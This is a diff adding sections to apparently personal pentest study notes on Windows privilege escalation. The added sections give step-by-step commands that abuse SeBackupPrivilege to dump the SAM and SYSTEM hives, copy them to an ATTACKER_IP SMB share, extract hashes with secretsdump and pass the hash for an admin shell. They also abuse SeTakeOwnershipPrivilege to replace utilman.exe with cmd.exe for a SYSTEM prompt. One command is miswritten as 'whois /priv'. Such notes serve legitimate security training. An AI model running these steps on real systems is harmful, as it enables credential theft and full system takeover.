@@ -1,5 +1,13 @@
 Notes about privilege escalation on [[Windows]].
 
+## Windows Privileges
+
+Run `whois /priv` to view current user's privileges.
+
+A full list of privileges can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
+
+A list of privilege exploits can be found [here](https://github.com/gtworek/Priv2Admin).
+
 ## Scheduled Tasks
 
 [[Windows/Enumeration#Scheduled Tasks]]
@@ -107,6 +115,88 @@ Execute on the target computer:
 ```
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
+
+## SeBackupPrivilege / SeRestorePrivilege
+
+[[Windows/Enumeration#SeBackupPrivilege / SeRestorePrivilege]]
+
+Run `whoami /priv` and check for `SeBackupPrivilege` and `SeRestorePrivilege`.
+
+On the target computer, backup SAM and System hashes:
+
+```
+reg save hklm\system C:\Users\User\system.hive
+reg save hklm\sam C:\Users\User\sam.hive
+```
+
+On the attacking computer, use [impacket](https://www.kali.org/tools/impacket/) to set up a SAM server.
+
+```bash
+# Create a new directory
+mkdir share
+
+# Start the SAM server using same credentials as the target Windows user
+python /opt/impacket/examples/smbserver.py -smb2support -username User -password password123 public share
+```
+
+On the target computer, copy the files to the attacking computer:
+
+```
+copy C:\Users\User\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\User\system.hive \\ATTACKER_IP\public\
+```
+
+On the attacking computer, use impacket to retrieve hashes:
+
+```bash
+python /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+Check for Administrator's hash, i.e.
+
+```
+Administrator:500:HASH_PART_1:HASH_PART_2:::
+```
+
+Use Pass-the-Hash attack on Administrator's hashed password:
+
+```shell
+python /opt/impacket/examples/psexec.py -hashes HASH_PART_1:HASH_PART_2 administrator@TARGET_IP
+```
+
+
+## SeTakeOwnershipPrivilege
+
+[[Windows/Enumeration#SeTakeOwnershipPrivilege]]
+
+Run `whoami /priv` and check for `SeTakeOwnershipPrivilege`.
+
+Take ownership of a application running with `SYSTEM` privileges, e.g. `utilman.exe` (built in accessibility application).
+
+Take ownership of `utilman.exe`:
+
+```
+takeown /f C:\Windows\System32\Utilman.exe
+```
+
+Give the current user full permissions:
+
+```
+icacls C:\Windows\System32\Utilman.exe /grant User:F
+```
+
+Replace `utilman.exe` with `cmd.exe`:
+
+```
+cd C:\Windows\System32\
+copy cmd.exe utilman.exe
+```
+
+Trigger `utilman.exe` (`cmd.exe`):
+
+1. Start menu -> User profile -> Lock
+2. On the lock screen, click 'Ease of Access'.
+3. A command prompt should open with `SYSTEM` privileges.
 
 ## Related
 
